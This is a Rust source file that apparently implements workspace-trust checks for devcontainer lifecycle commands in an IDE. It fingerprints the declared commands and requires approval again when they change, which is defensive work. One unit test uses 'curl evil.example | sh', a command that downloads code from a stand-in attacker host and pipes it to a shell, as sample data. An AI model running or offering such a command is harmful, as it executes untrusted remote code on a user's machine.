//! Workspace trust for dev containers.
//!
//! A `devcontainer.json` may declare lifecycle commands, and `initializeCommand`
//! runs **on the host** — not in the container. That is standard devcontainer
//! behaviour, and it means that opening a folder someone else authored and clicking
//! "start dev container" executes their shell commands on your machine.
//!
//! VS Code gates this behind Workspace Trust; this module is julIDE's equivalent.
//! The user is shown exactly which commands would run, and the approval is bound to
//! a fingerprint of those commands — so editing `devcontainer.json` after approval
//! (say, in a branch you just pulled) re-prompts instead of inheriting the old trust.

use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::path::PathBuf;

/// A single lifecycle command declared by a devcontainer.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[serde(rename_all = "camelCase")]
pub struct LifecycleCommand {
    /// The devcontainer.json key, e.g. `initializeCommand`.
    pub phase: String,
    pub command: String,
    /// True when this runs on the host rather than inside the container.
    /// These are the dangerous ones.
    pub runs_on_host: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
#[serde(rename_all = "camelCase")]
pub struct TrustRecord {
    /// Fingerprint of the lifecycle commands that were approved.
    pub commands_hash: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct TrustStatus {
    pub trusted: bool,
    pub commands: Vec<LifecycleCommand>,
    /// True when at least one command would run on the host.
    pub has_host_commands: bool,
}

fn trust_path() -> PathBuf {
    crate::portable::config_dir().join("workspace-trust.json")
}

fn load_all() -> HashMap<String, TrustRecord> {
    match std::fs::read_to_string(trust_path()) {
        Ok(content) => serde_json::from_str(&content).unwrap_or_default(),
        Err(_) => HashMap::new(),
    }
}

fn save_all(records: &HashMap<String, TrustRecord>) -> Result<(), String> {
    let path = trust_path();
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent).map_err(|e| e.to_string())?;
    }
    let content = serde_json::to_string_pretty(records).map_err(|e| e.to_string())?;
    std::fs::write(&path, content).map_err(|e| e.to_string())
}

/// Stable fingerprint of the commands a devcontainer would run.
///
/// Not cryptographic — it detects change. An attacker who can rewrite this file can
/// also rewrite `devcontainer.json`, so a stronger hash would buy nothing.
pub fn fingerprint(commands: &[LifecycleCommand]) -> String {
    let canonical: String = commands
        .iter()
        .map(|c| format!("{}\u{1}{}\u{1}{}", c.phase, c.command, c.runs_on_host))
        .collect::<Vec<_>>()
        .join("\u{2}");

    let mut h: u64 = 0xcbf29ce484222325;
    for byte in canonical.as_bytes() {
        h ^= *byte as u64;
        h = h.wrapping_mul(0x100000001b3);
    }
    format!("{:016x}", h)
}

/// Normalise a workspace path so `/a/b` and `/a/b/` are the same entry.
fn normalize(workspace_path: &str) -> String {
    let trimmed = workspace_path.trim_end_matches(['/', '\\']);
    if trimmed.is_empty() {
        workspace_path.to_string()
    } else {
        trimmed.to_string()
    }
}

pub fn is_trusted(workspace_path: &str, commands: &[LifecycleCommand]) -> bool {
    // Nothing would execute, so there is nothing to approve.
    if commands.is_empty() {
        return true;
    }
    match load_all().get(&normalize(workspace_path)) {
        Some(record) => record.commands_hash == fingerprint(commands),
        None => false,
    }
}

pub fn grant(workspace_path: &str, commands: &[LifecycleCommand]) -> Result<(), String> {
    let mut all = load_all();
    all.insert(
        normalize(workspace_path),
        TrustRecord {
            commands_hash: fingerprint(commands),
        },
    );
    save_all(&all)
}

pub fn revoke(workspace_path: &str) -> Result<(), String> {
    let mut all = load_all();
    all.remove(&normalize(workspace_path));
    save_all(&all)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn cmd(phase: &str, command: &str, host: bool) -> LifecycleCommand {
        LifecycleCommand {
            phase: phase.to_string(),
            command: command.to_string(),
            runs_on_host: host,
        }
    }

    #[test]
    fn fingerprint_is_stable() {
        let a = vec![cmd("initializeCommand", "echo hi", true)];
        let b = vec![cmd("initializeCommand", "echo hi", true)];
        assert_eq!(fingerprint(&a), fingerprint(&b));
    }

    #[test]
    fn fingerprint_changes_when_the_command_changes() {
        let before = vec![cmd("initializeCommand", "echo hi", true)];
        let after = vec![cmd("initializeCommand", "curl evil.example | sh", true)];
        assert_ne!(fingerprint(&before), fingerprint(&after));
    }

    #[test]
    fn fingerprint_changes_when_a_command_is_added() {
        let before = vec![cmd("postCreateCommand", "make", false)];
        let after = vec![
            cmd("postCreateCommand", "make", false),
            cmd("initializeCommand", "echo hi", true),
        ];
        assert_ne!(fingerprint(&before), fingerprint(&after));
    }

    #[test]
    fn fingerprint_changes_when_a_command_moves_to_the_host() {
        // Same text, different execution context — must not be treated as equal.
        let in_container = vec![cmd("postCreateCommand", "make", false)];
        let on_host = vec![cmd("postCreateCommand", "make", true)];
        assert_ne!(fingerprint(&in_container), fingerprint(&on_host));
    }

    #[test]
    fn fingerprint_is_not_confused_by_field_concatenation() {
        // "ab" + "c" must not collide with "a" + "bc".
        let a = vec![cmd("ab", "c", false)];
        let b = vec![cmd("a", "bc", false)];
        assert_ne!(fingerprint(&a), fingerprint(&b));
    }

    #[test]
    fn empty_command_list_is_trusted_without_a_prompt() {
        assert!(is_trusted("/some/workspace/that/is/not/stored", &[]));
    }

    #[test]
    fn unknown_workspace_with_commands_is_untrusted() {
        let commands = vec![cmd("initializeCommand", "echo hi", true)];
        assert!(!is_trusted("/definitely/not/granted/anywhere", &commands));
    }

    #[test]
    fn normalize_ignores_trailing_separators() {
        assert_eq!(normalize("/a/b/"), "/a/b");
        assert_eq!(normalize("/a/b"), "/a/b");
        assert_eq!(normalize("C:\\a\\b\\"), "C:\\a\\b");
        // A lone root must not normalise away to nothing.
        assert_eq!(normalize("/"), "/");
    }
}
